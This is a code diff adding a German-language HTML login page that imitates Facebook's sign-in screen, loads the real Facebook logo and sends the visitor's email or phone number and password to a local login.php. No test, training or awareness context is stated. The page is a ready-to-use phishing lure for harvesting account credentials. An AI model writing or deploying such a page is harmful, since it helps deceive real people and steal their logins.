@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook – Anmelden</title>
+    <style>
+        body { font-family: Helvetica, Arial; background: #e9ebee; }
+        .container { width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
+        img { width: 200px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+        <form method="POST" action="login.php">
+            <input type="text" name="email" placeholder="E-Mail oder Telefonnummer" required>
+            <input type="password" name="password" placeholder="Passwort" required>
+            <button type="submit">Anmelden</button>
+        </form>
+    </div>
+</body>
+</html>
